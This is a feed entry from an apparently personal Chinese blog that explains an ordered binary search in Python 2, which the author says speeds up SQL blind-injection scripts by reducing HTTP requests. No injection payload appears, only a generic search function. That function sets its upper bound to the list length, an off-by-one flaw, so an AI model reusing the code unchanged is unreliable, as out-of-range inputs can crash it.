    <content type="html"><![CDATA[<h1 id="python有序二分查找算法"><a href="#python有序二分查找算法" class="headerlink" title="python有序二分查找算法"></a>python有序二分查找算法</h1><p><strong>感觉自己的博客更新的很慢，看到自己博客不更新文章的话总会很焦虑，因为总想写点有意义的技术文章，但是想了想，博客本来就是一个记录知识的地方，将自己学习的过程记录下来也是个不错的选择，即使是一个小知识点也值得记录，以便以后不会忘记，所以以后博客的更新次数应该会很频繁，博客的日志是时候该充实一下了。写给自己，迷茫的时候多研究点知识，多写博客总结，知识需要不断沉淀</strong></p><p><strong>记录一个用python写SQL盲注脚本时需要用到的一个算法，在使用盲注的技术去判断数据库的内容时，使用二分法可以加快查找速度，相比于自加的判断可以减少所发送的http请求</strong><br><a id="more"></a></p><h3 id="二分查找算法代码"><a href="#二分查找算法代码" class="headerlink" title="二分查找算法代码"></a>二分查找算法代码</h3><p><strong>首先需要给定一个查找的范围，也就是区域。其次要求被查找的列表是有序的，贴出代码</strong></p><pre><code>#coding=utf-8def binary_search(sealist,find):    low=0    high=len(sealist)    while low&lt;=high:        mid=(low+high)/2        if find==sealist[mid]:            return mid        elif find&lt;sealist[mid]:            high=mid-1        elif find&gt;sealist[mid]:            low=mid+1        else:            return -1sealist=range(0,1000)find=input(&quot;please input a number:&quot;)result=binary_search(sealist,find)if result&gt;=0:    print &quot;Catch Element %s!    Position:%s!&quot;%(str(find),str(result+1))else:    print &quot;Sorry,The Element Not Found.&quot;</code></pre><p><strong>利用二分法通过不断地缩小查找区域最终锁定查找的内容，二分法相比于普通的循环自增查找，查找次数减少了很多，速度自然提升了不少。举个例子，如果采用自增查找的方式，在0-1000列表中查找到100的位置需要101次，但是上面的代码利用了有序二分查找到100的位置只需要7次</strong><br><img src="http://pic.c1imber.top/blog/180604/0F8j4m5mfK.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python有序二分查找算法&quot;&gt;&lt;a href=&quot;#python有序二分查找算法&quot; class=&quot;headerlink&quot; title=&quot;python有序二分查找算法&quot;&gt;&lt;/a&gt;python有序二分查找算法&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;感觉自己的博客更新的很慢，看到自己博客不更新文章的话总会很焦虑，因为总想写点有意义的技术文章，但是想了想，博客本来就是一个记录知识的地方，将自己学习的过程记录下来也是个不错的选择，即使是一个小知识点也值得记录，以便以后不会忘记，所以以后博客的更新次数应该会很频繁，博客的日志是时候该充实一下了。写给自己，迷茫的时候多研究点知识，多写博客总结，知识需要不断沉淀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;记录一个用python写SQL盲注脚本时需要用到的一个算法，在使用盲注的技术去判断数据库的内容时，使用二分法可以加快查找速度，相比于自加的判断可以减少所发送的http请求&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://lawlietweb.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="算法" scheme="http://lawlietweb.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
